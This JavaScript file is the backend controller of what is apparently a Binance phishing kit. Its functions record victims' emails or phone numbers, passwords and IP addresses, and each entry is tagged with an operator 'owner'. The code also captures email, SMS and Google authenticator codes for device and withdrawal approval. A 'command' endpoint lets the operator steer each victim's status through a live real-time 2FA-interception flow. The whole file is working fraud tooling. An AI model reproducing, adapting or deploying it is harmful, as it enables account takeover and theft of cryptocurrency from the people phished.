const Binance = require("../models/binanceModel");

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  Binance.find({ owner })
    .sort({ status: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const command = async (req, res) => {
  const { uniqueid, status, emailHolder, telephoneHolder } = req.body;
  try {
    if (status == 2 || status == 4) {
      await Binance.findOneAndUpdate(
        { uniqueid },
        { status, emailHolder, telephoneHolder }
      ).exec();
    } else {
      await Binance.findOneAndUpdate({ uniqueid }, { status }).exec();
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  Binance.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { telephone, email, password, uniqueid, owner, ip } = req.body;
  try {
    if (telephone) {
      await Binance.create({
        uniqueid,
        telephone,
        password,
        status: 2,
        owner,
        ip,
      });
    } else {
      await Binance.create({
        uniqueid,
        email,
        password,
        status: 2,
        owner,
        ip,
      });
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { telephone, email, password, uniqueid } = req.body;
  try {
    if (telephone) {
      await Binance.findOneAndUpdate(
        { uniqueid },
        { telephone, password, status: 7 }
      ).exec();
    } else {
      await Binance.findOneAndUpdate(
        { uniqueid },
        { email, password, status: 7 }
      ).exec();
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitDeviceAuth = async (req, res) => {
  const { emailCode, telephoneCode, googleCode, uniqueid } = req.body;
  try {
    if (googleCode) {
      await Binance.findOneAndUpdate(
        { uniqueid },
        { emailCode, telephoneCode, googleCode, status: 3 }
      ).exec();
    } else {
      await Binance.findOneAndUpdate(
        { uniqueid },
        { emailCode, telephoneCode, status: 3 }
      ).exec();
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitWithdrawalAuth = async (req, res) => {
  const { emailCode, telephoneCode, googleCode, uniqueid } = req.body;
  try {
    if (googleCode) {
      await Binance.findOneAndUpdate(
        { uniqueid },
        { emailCode, telephoneCode, googleCode, status: 5 }
      ).exec();
    } else {
      await Binance.findOneAndUpdate(
        { uniqueid },
        { emailCode, telephoneCode, status: 5 }
      ).exec();
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await Binance.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  deleteEntry,
  submitDeviceAuth,
  submitWithdrawalAuth,
};
